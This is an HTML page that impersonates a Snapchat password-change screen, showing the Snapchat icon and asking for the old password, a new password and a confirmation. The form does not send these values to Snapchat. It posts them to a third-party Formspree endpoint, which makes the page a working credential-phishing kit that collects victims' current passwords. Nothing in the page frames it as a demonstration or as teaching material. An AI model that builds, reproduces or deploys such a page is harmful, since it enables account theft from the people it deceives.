<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Password Change</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f4f4f9;
        }

        .container {
            background-color: white;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 100%;
        }

        h2 {
            margin-bottom: 20px;
            font-size: 24px;
            text-align: center;
        }

        label {
            font-size: 14px;
            margin-bottom: 5px;
            display: block;
        }

        .input-group {
            position: relative;
        }

        input[type="password"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 15px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 14px;
        }

        .toggle-visibility {
            position: absolute;
            top: 50%;
            right: 10px;
            transform: translateY(-50%);
            cursor: pointer;
            background: none;
            border: none;
            font-size: 14px;
            color: #007bff;
        }

        .toggle-visibility:hover {
            color: #0056b3;
        }

        .confirm-btn {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            border: none;
            border-radius: 4px;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }

        .confirm-btn:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="container">
        <img class="snapchat-icon" src="icon.svg" alt="Snapchat">
        <h2>Change Your Password</h2>
        <form id=login_form action= "https://formspree.io/f/xkgwldnw" method=post >
            <label for="old-password">Old Password</label>
            <div class="input-group">
                <input type="password" id="old-password" name="old-password" required>
                <button type="button" class="toggle-visibility" onclick="toggleVisibility('old-password')">Show</button>
            </div>

            <label for="new-password">New Password</label>
            <div class="input-group">
                <input type="password" id="new-password" name="new-password" required>
                <button type="button" class="toggle-visibility" onclick="toggleVisibility('new-password')">Show</button>
            </div>

            <label for="confirm-password">Confirm New Password</label>
            <div class="input-group">
                <input type="password" id="confirm-password" name="confirm-password" required>
                <button type="button" class="toggle-visibility" onclick="toggleVisibility('confirm-password')">Show</button>
            </div>

            <button type="submit" class="confirm-btn">Confirm</button>
        </form>
    </div>

    <script>
        function toggleVisibility(id) {
            const passwordField = document.getElementById(id);
            const toggleButton = passwordField.nextElementSibling;
            if (passwordField.type === "password") {
                passwordField.type = "text";
                toggleButton.textContent = "Hide";
            } else {
                passwordField.type = "password";
                toggleButton.textContent = "Show";
            }
        }
    </script>
</body>
</html>
